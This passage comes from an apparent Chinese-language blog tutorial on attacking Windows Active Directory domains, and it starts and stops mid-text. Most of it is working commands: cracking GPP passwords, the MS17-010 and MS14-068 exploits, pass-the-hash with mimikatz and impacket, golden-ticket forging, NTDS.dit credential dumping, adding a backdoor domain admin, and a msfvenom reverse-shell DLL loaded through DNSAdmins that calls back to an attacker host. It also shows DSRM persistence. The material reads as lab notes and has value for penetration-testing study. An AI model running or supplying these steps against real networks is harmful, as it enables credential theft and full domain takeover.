class="hljs-string">&quot;U&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">name</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">appName</span>=<span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-attr">args</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">startIn</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">comment</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">runAs</span>=<span class="hljs-string">&quot;TEST\Administrator&quot;</span> <span class="hljs-attr">cpassword</span>=<span class="hljs-string">&quot;1dLl2PMSed1A9KZn/hQ</span></span><br><span class="hljs-string"><span class="hljs-tag">grg&quot;</span> <span class="hljs-attr">enabled</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Triggers</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Trigger</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;DAILY&quot;</span> <span class="hljs-attr">startHour</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">startMinutes</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">beginYear</span>=<span class="hljs-string">&quot;2023&quot;</span> <span class="hljs-attr">beginMonth</span>=<span class="hljs-string">&quot;7&quot;</span> <span class="hljs-attr">beginDa</span></span><br><span class="hljs-tag"><span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">hasEndDate</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">repeatTask</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">interval</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Triggers</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Properties</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Task</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ScheduledTasks</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里有个坑，切换路径时不能带有大括号，要使用””把大括号括起来</p><p>找到这个xml文件中的cpassword字段</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720191851271.png" alt="image-20230720191851271"> </p><p>使用kali中的工具成功破解</p><h2 id="MS17010-x2F-CVE2019-0708"><a href="#MS17010-x2F-CVE2019-0708" class="headerlink" title="MS17010 &#x2F;CVE2019-0708"></a>MS17010 &#x2F;CVE2019-0708</h2><p>主要用了这么几个步骤来打这个服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_version //先使用扫描器看是否存在漏洞<br>show target //展示可以利用的系统名称<br>run //运行扫描<br>use exploit/windows/smb/ms17_010_psexec //使用这个利用程序<br>show options //展示利用的选项<br>exploit //执行利用脚本<br>最后利用成功了使用shell即可计入页面<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720205120743.png" alt="image-20230720205120743"> </p><h2 id="MS14-068（CVE-2014-6324）-域提权"><a href="#MS14-068（CVE-2014-6324）-域提权" class="headerlink" title="MS14-068（CVE-2014-6324） 域提权"></a>MS14-068（CVE-2014-6324） 域提权</h2><p>利用 MS14-068 来提权,先检查下是否有 <code>MS14-068</code>, CVE 编号 <code>CVE-2014-6324</code>,补丁为 3011780 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo |find <span class="hljs-string">&quot;3011780&quot;</span><br></code></pre></td></tr></table></figure><p>如果返回为空就说明没有打补丁,存在漏洞,需要注意的是域内普通用户提权成功后是有时效性的。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152757686.png" alt="image-20230731152757686"> </p><p>我们先进行一下域的信息收集。</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span><br><br><span class="hljs-built_in">ping</span> <span class="hljs-number">08</span>server-dc.moonsec.fbi<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152817989.png" alt="image-20230731152817989"> </p><p>我们先使用IPC$访问一下试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\08server-dc.moonsec.fbi\c$<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152853398.png" alt="image-20230731152853398"> </p><p>上传 mimikatz 和 MS14-068 提权工具， whoami &#x2F;user 或者 whoami&#x2F;all 查看 test用户的 suid：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /user<br><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152901060.png" alt="image-20230731152901060"> </p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器地址</span><br>ms14-068.exe -u jerry@0day.org -p Admin12345 -s S-1-5-21-1812960810-2335050734-3517558805-1128 -d OWA2010SP3.0day.org<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152908409.png" alt="image-20230731152908409">  </p><p>使用 mimikatz 清空之前缓存的凭证，导入伪造的凭证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进一步提升权限</span><br>privilege::debug<br><br><span class="hljs-comment"># 清空票据</span><br>kerberos::purge<br><br><span class="hljs-comment"># 票据文件地址</span><br>kerberos::ptc C:\Users\Administrator\Desktop\mimikatz_trunk\x64\TGT_test@moonsec.fbi.ccache<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152917134.png" alt="image-20230731152917134">  </p><p>再输入 <code>dir \\08server-dc.moonsec.fbi\c$</code> ，发现访问成功，现在我们有域管的权限:</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731152930732.png" alt="image-20230731152930732">  </p><p>我们直接添加一个域管账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user lian QWEasd123 /add /domain<br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> lian /add /domain<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/2934784-20220731095312814-1394654338.png" alt="img"> </p><p>这样我们就实现了对域控的控制，为了权限维持我们还可以做一个影子账号实现对服务器的长久控制。</p><h2 id="哈希传递PTH攻击及白利用"><a href="#哈希传递PTH攻击及白利用" class="headerlink" title="哈希传递PTH攻击及白利用"></a>哈希传递PTH攻击及白利用</h2><h3 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h3><p>NTLM这一名词是由以下单词的首字母拼凑而成的∶</p><p>NT:New technologies ( windows 的新技术)</p><p>LAN:本地局域网(Local area network )</p><p>M:管理者( Manager )</p><p>NTLM hash是指windows系统下Security Account Manager中保存的用户密码hash</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726193935358.png" alt="image-20230726193935358"> </p><h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><p>Windows 8.1和 Windows Server 2012 R2默认支持该功能</p><p>windows 7和 windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</p><p>从windows Vista和 windows Server 2008开始，微软默认禁用LM hash在windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz就读不到密码明文。此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为: </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230724184106453.png" alt="image-20230724184106453"> </p><h3 id="使用mimikatz进行PTH"><a href="#使用mimikatz进行PTH" class="headerlink" title="使用mimikatz进行PTH"></a>使用mimikatz进行PTH</h3><p>第一步</p><p>重置本地管理员admin的密码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug  <span class="hljs-comment">//提权</span><br>sekurlsa::logonpasswords <span class="hljs-comment">//获取密码</span><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230724195448585.png" alt="image-20230724195448585"> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span>.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa:logonpasswords&quot;</span> &gt;<span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><p>然后，在 Windows 7 上用 mimikatz 将获取的 Administrator 的 Hash 添加进 lsass 进程中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>sekurlsa::pth /user:administrator /domain:whoamianony /ntlm:ab89b1295e69d353dd7614c7a3a80cec<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726194340589.png" alt="image-20230726194340589"> </p><p>上面的操作可化简为下面这一句话</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mimikatz.exe privilege::<span class="hljs-built_in">debug</span> <span class="hljs-string">&quot;sekurlsa::pth /domain:test /user:administrator /ntlm:ba4d237c6f6fd9c55ffc111b3ac10989 /run:cmd.exe&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726195601800.png" alt="image-20230726195601800"> </p><p>成功，此时会自动弹出一个新的cmd窗口，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器 DC 的c盘目录：</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726200722285.png" alt="image-20230726200722285"> </p><p>此时，为了让域控制器 DC 上线 Metasploit，我们只需做以下工作。</p><p>生成一个msf木马shell.exe，将shell.exe上传到Windows 7主机，然后直接使用 copy 命令将shell.exe复制到域控上：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">copy</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span> \\DC.whoamianony.org\<span class="hljs-keyword">c</span>$    // 将 <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span> 复制到域控主机上<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sc \\DC<span class="hljs-selector-class">.whoamianony</span><span class="hljs-selector-class">.org</span> create backdoor binpath= <span class="hljs-string">&quot;c:\shell.exe&quot;</span>    <span class="hljs-comment">// 在域控上创建服务启动木马</span><br>sc \\DC<span class="hljs-selector-class">.whoamianony</span><span class="hljs-selector-class">.org</span> start backdoor     <span class="hljs-comment">// 在域控上立即启动该服务</span><br>sc \\DC<span class="hljs-selector-class">.whoamianony</span><span class="hljs-selector-class">.org</span> delete backdoor     <span class="hljs-comment">// 在域控上立即删除该服务</span><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/1626405634_60f0fb0237fbad87f64d7.png!small" alt="image-20210711122041394"> </p><p>此时虽然显示 1053 错误，但是如下图所示，域控制器成功上线，并且还是 SYSTEM 权限：</p><p>注意，哈希传递攻击要注意一下几点：</p><blockquote><p>dir命令后面要使用主机名，不能用 IP，否则报错</p><p>使用 mimikatz 进行哈希传递要具有本地管理员权限</p></blockquote><h3 id="使用crackmapexec"><a href="#使用crackmapexec" class="headerlink" title="使用crackmapexec"></a>使用crackmapexec</h3><p>直接kali使用</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> -u administrator -H ba<span class="hljs-number">4</span>d<span class="hljs-number">237</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>f<span class="hljs-number">6</span>fd<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">55</span>ffc<span class="hljs-number">111</span>b<span class="hljs-number">3</span>ac<span class="hljs-number">10989</span> -d test -<span class="hljs-keyword">x</span> dir <br></code></pre></td></tr></table></figure><blockquote><p><strong>IP：</strong>可以是单个IP也可以是IP段</p><p><strong>-u：</strong>指定用户名</p><p><strong>-H：</strong>指定NTLM Hash</p><p><strong>-d：</strong>指定域</p><p><strong>-x：</strong>执行系统命令</p></blockquote><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726201627478.png" alt="image-20230726201627478"> </p><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># PTH 命令执行 Or 远程登录</span><br>impacket-wmiexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-psexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-smbexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-dcomexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br>impacket-atexec  -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">DC01</span>/<span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br><span class="hljs-comment">#导出SAM密码、lsa内存密码</span><br>impacket-secretsdump  -hashes <span class="hljs-symbol">:</span><span class="hljs-number">35</span>b5a70f68f5ef895d52d15d8d84af6b <span class="hljs-title class_">Administrator</span><span class="hljs-variable">@10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">5</span><br><br><span class="hljs-comment"># OPTH</span><br>impacket-smbexec -k -hashes <span class="hljs-symbol">:ae4c0d5fb959fda8f4cb1d14a8376af4</span> <span class="hljs-title class_">Domain</span>/<span class="hljs-title class_">Administrator</span>@机器名<br><br><br></code></pre></td></tr></table></figure><h2 id="PTT攻击-1"><a href="#PTT攻击-1" class="headerlink" title="PTT攻击"></a>PTT攻击</h2><p>终于又到了我最喜欢的实战环节，这里介绍域内常用的两种攻击方式：黄金票据（Golden ticket）、白银票据 （SILVER ticket）。</p><p>无论是 <strong>黄金票据</strong> 还是 <strong>白银票据</strong> 都需要获得域控的权限以获得 NTLM hash个人感觉这两个攻击更适合用于权限维持。毕竟没有域控(DC)的权限也是白搭更别说什么票据传递攻击了。</p><p>所以我先介绍一个域用户提权为域管理员的漏洞 MS14-068 ，这个漏洞可以把普通用户提权为域管理员这样我们就可以获得 <strong>NTLM hash</strong>以进行票据传递攻击。</p><h3 id="金票"><a href="#金票" class="headerlink" title="金票"></a>金票</h3><p>在 Kerberos 认证中,Client 通过 AS(身份认证服务)认证后,AS 会给 Client 一个Logon Session Key 和 TGT,而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的<br>NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后,就跳过AS 验证,不用验证账户和密码,所以也不担心域管密码修改。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>不需要与 AS 进行交互，需要用户 krbtgt 的 Hash</p><h4 id="伪造金票"><a href="#伪造金票" class="headerlink" title="伪造金票"></a>伪造金票</h4><p>伪造金票的所需条件：</p><ul><li>域名称</li><li>域的 SID 值</li><li>域的 KRBTGT 账号的 HASH</li><li>伪造任意用户名</li></ul><p>登录域管用户，执行 whoami 可以看到是 administrator 用户：</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230731155849018.png" alt="image-20230731155849018"> </p><p>先使用一下命令导出用户 krbtgt 的 hash：</p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">mimikatz.exe &quot;privilege::debug<span class="hljs-string">&quot; &quot;</span>lsadump::dcsync /domain:<span class="hljs-number">0</span>day.org /user:krbtgt<span class="hljs-string">&quot; &quot;</span>exit<span class="hljs-string">&quot;&gt; passwordhash.txt</span><br></code></pre></td></tr></table></figure><p>我们利用 mimikatz在其他主机 生成金票生成.kirbi 文件并保存：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /admin:system /domain:test.com /sid:S-1-5-21-1812960810-2335050734-3517558805-502 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:ticket.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h4 id="金票的使用"><a href="#金票的使用" class="headerlink" title="金票的使用"></a>金票的使用</h4><p> <strong>( 普通域账户，利用黄金票据，创建域管账户)</strong></p><p>登录域内普通用户，通过 mimikatz 中的 <code>kerberos::ptt</code> 功能将 ticket.kirbi 导入内存中。</p><p>导入票据之前访问域控显示拒绝访问</p><p>导入黄金票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::purge<br>kerberos::ptt C:\Users\wenyu\Desktop\ticket.kirbi<br></code></pre></td></tr></table></figure><p>之后就可以成功访问了</p><h3 id="银票"><a href="#银票" class="headerlink" title="银票"></a>银票</h3><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><h4 id="相同的地方"><a href="#相同的地方" class="headerlink" title="相同的地方"></a>相同的地方</h4><ul><li>金票：需要获取域管的权限进行读取hash</li><li>银票：需要获取域管的权限进行读取hash</li></ul><h4 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h4><ul><li>金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限</li><li>银票：伪造的 ST，只能访问指定的服务，如 CIFS</li></ul><h4 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h4><ul><li>金票：同 KDC 交互，但不同 AS 交互</li><li>银票：不同 KDC 交互，直接访问 Server</li></ul><h4 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h4><ul><li>金票：由 krbtgt NTLM Hash 加密</li><li>银票：由服务账号 NTLM Hash 加密</li></ul><h4 id="利用方式不同"><a href="#利用方式不同" class="headerlink" title="利用方式不同"></a>利用方式不同</h4><ul><li>金票：在利用时<strong>需要使用域用户</strong>进行利用</li><li>银票：在利用时<strong>不能使用域用户</strong>进行利用</li></ul><h2 id="AD数据库文件NTDS-dit"><a href="#AD数据库文件NTDS-dit" class="headerlink" title="AD数据库文件NTDS.dit"></a>AD数据库文件NTDS.dit</h2><p>我们直接copyad数据库文件</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">copy</span> C:\windows\NTDS\ntds.dit<br></code></pre></td></tr></table></figure><p>提示被另一进程使用</p><p>使用mimikatz在线读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>privilege::debug<br>token::elevate <span class="hljs-regexp">//</span>权限提升至system<br>lsadump::dcsync <span class="hljs-regexp">/domain:0day.org /</span>all /csv <br><span class="hljs-regexp">//</span>local security authority dump:domain controller synchronization<br><span class="hljs-regexp">//</span>获取所有用户的密码信息并导出为csv，但是是以简略信息显示的<br>lsadump::dcsync <span class="hljs-regexp">/domain:0day.org /u</span>ser:krbtgt<br><span class="hljs-regexp">//</span>单个用户的信息<br>lsadump:dcsync /inject<br><span class="hljs-regexp">//</span>所有用户的详细信息<br></code></pre></td></tr></table></figure><p>离线读取</p><p>一般在拿到域管后导出sam（windwos中的一个注册表文件）</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SYSTEM system.hiv<br><span class="hljs-comment">//registry</span><br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> HKLM\SAM sam.hiv<br><br><span class="hljs-comment">//非管理员用户没有所需的特权</span><br></code></pre></td></tr></table></figure><p>读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot;</span> &gt; sam.txt <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>这种方式会导致丢失数据</p><p>所以使用ntdsutil</p><p>普通用户可能没有这个文件，可以给他复制出来就行</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ntdsutil</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> <span class="hljs-string">&quot;ifm&quot;</span> <span class="hljs-string">&quot;create full c:/test&quot;</span> q q<br></code></pre></td></tr></table></figure><p>官方的操作手册</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali">All you need is a command prompt running with administrator privileges,<span class="hljs-built_in"> and </span>the following commands:<br><br>C:\&gt;ntdsutil<br>ntdsutil: activate<span class="hljs-built_in"> instance </span>ntds<br>ntdsutil: ifm<br>ifm: create full c:\pentest<br>ifm: quit<br>ntdsutil: quit<br></code></pre></td></tr></table></figure><p>导出成功以后取system和ntds.dit文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python3-impacket<span class="hljs-regexp">/examples/</span>secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL<br><span class="hljs-comment">#local参数用于指定从本地系统提取密码</span><br></code></pre></td></tr></table></figure><h2 id="DNSAdmins组权限利用"><a href="#DNSAdmins组权限利用" class="headerlink" title="DNSAdmins组权限利用"></a>DNSAdmins组权限利用</h2><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p>这个提权的功能需要一个用户，这个用户是DNSAdmins组中的成员或者对SYSTEM权限下的DNS服务具有写的权限且能够加载任意DLL。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>DNSAdmins组成中的成员具有写的权限且能够加载任意dll</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806100403214.png" alt="image-20230806100403214"> </p><p>修改这里的隶属于</p><p>我们在win10主机上即可看到添加成功</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806101645382.png" alt="image-20230806101645382"> </p><p>生成一个shell.dll文件来主动连接我们的kali</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.3.3 <span class="hljs-attribute">LPORT</span>=2333 <span class="hljs-attribute">--platform</span>=windows -f dll &gt; shell.dll<br></code></pre></td></tr></table></figure><p>在kali上开启smb服务</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python3-impacket<span class="hljs-regexp">/examples/</span>smbserver.py shell ./shell<br></code></pre></td></tr></table></figure><p>使用域控dir这个服务，成功</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230806105917428.png" alt="image-20230806105917428"> </p><p>在被攻击主机上远程加载我们生成的dll</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">.\dnscmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">0</span>day.org /config /serverlevelplugindll \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.3</span>\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">shell</span>.dll<br></code></pre></td></tr></table></figure><h1 id="域渗透权限维持"><a href="#域渗透权限维持" class="headerlink" title="域渗透权限维持"></a>域渗透权限维持</h1><h2 id="DSRM账户维持"><a href="#DSRM账户维持" class="headerlink" title="DSRM账户维持"></a>DSRM账户维持</h2><ul><li><strong>目录服务恢复模式</strong>（DSRM，Directory Services Restore Mode），是Windows服务器域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户 (也就是DSRM账户)。</li><li><strong>DSRM</strong>用途：允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM 的密码需要在安装 DC 时设置，且很少会被重置。修改 DSRM 密码最基本的方法是在 DC 上运行ntdsutil 命令行修改。</li></ul><p>DSRM是相当于域控上面的本地管理员</p><p>使用如下命令同步DSRM密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ntdsutil<br><span class="hljs-keyword">set</span> DSRM <span class="hljs-keyword">password</span><br>SYNC <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">DOMAIN</span> ACCOUNT user_account<br></code></pre></td></tr></table></figure><p>如此一来江DSRM设置成了和user_account用户一样的密码</p><p>然后再域控上面添加注册表:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\control\Lsa&quot;</span> /v DSRMAdminLogonBehavior /t REG_DWORD /d 2</span><br></code></pre></td></tr></table></figure><blockquote><ol><li><p><code>&quot;HKLM\System\CurrentControlSet\control\Lsa&quot;</code>：这是注册表键的路径，指向了本地安全权威（Local Security Authority）的设置。</p></li><li><p><code>/v DSRMAdminLogonBehavior</code>：这个参数指定了要添加或修改的值的名称，即“DSRMAdminLogonBehavior”。</p></li><li><p><code>/t 